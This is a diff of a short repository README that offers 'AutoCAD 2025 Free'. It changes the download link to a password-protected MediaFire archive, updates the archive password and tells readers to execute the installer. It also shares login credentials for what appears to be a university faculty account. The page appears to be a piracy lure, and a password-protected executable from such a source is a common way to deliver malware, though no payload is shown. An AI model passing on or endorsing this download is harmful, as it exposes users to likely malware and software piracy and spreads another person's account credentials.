@@ -1,10 +1,10 @@
 # AutoCad-2025-Free
 
-[Click here to Download](https://www.mediafire.com/file/bibqecm85ef42du/AutoCad2025.zip/file)
+[Click here to Download](https://www.mediafire.com/file/pgbkpvbpg6so0si/AutoCAD_2025_Win64_install.zip/file)
 
-[Pass : Educati0n4fr33@! ]
+[Pass : S0f4fr33!]
 
-Once the Installer is downloaded execute the file. The login information is: faculty1@uoft.edu Pass: Education4free
+Once the Installer is downloaded execute the file. The login information is: faculty1@uoft.edu Pass: S0f4fr33!
 
 What is Autodesk AutoCAD?
 
